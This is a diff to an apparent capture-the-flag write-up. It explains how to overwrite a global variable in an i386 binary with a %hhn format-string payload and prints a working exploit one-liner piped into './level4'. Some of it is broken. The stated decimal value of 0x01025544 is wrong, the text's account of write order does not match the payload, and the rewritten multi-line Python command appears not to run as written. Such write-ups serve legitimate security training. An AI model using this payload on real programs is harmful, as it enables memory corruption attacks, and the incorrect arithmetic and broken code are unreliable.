@@ -2,7 +2,7 @@
 
 This level is very similar to the previous one, the two differences being that printf is called from within a function, and that the `m` global variable should be equal to `0x01025544` to pass the check. In decimal that's 16909060, which is impossible to write in one go with %n since it would require more than 16 million characters to be printed.
 
-The workaround is to write the desired value one byte at a time using the `%hhn` specifier, which writes a single byte. The idea is to write the least significant byte first (0x44), then the next one (0x55), and so on. This way we only need to print at most 85 characters at a time.
+The workaround is to write the desired value one byte at a time using the `%hhn` specifier, which writes a single byte. The idea is to write the least significant byte first (0x44), then the next one (0x55), and so on. This way we only need to print at most 85 (0x55)characters at a time.
 
 Eventually, the memory layout should look like this:
 
@@ -17,9 +17,11 @@ Eventually, the memory layout should look like this:
 
 Again, i386 is little-endian, so the least significant byte (right-most) is stored at the lowest address (left-most).
 
-(python -c 'import struct; m=0x8049810; payload=struct.pack("<I",m+3)+struct.pack("<I",m+2)+struct.pack("<I",m)+struct.pack("<I",m+1)+"%241c%12$hhn%1c%13$hhn%66c%14$hhn%17c%15$hhn"; print(payload)'; cat) | ./level4
-
-```bash
-python -c 'print()' >/tmp/payload
-cat /tmp/payload - | ./level4
-```
+python -c 'import struct;
+m=0x8049810;
+payload=struct.pack("<I",m+3)
++ struct.pack("<I",m+2)
++ struct.pack("<I",m)
++ struct.pack("<I",m+1)
++ "%241c%12$hhn%1c%13$hhn%66c%14$hhn%17c%15$hhn";
+print(payload)' | ./level4 >/tmp/token
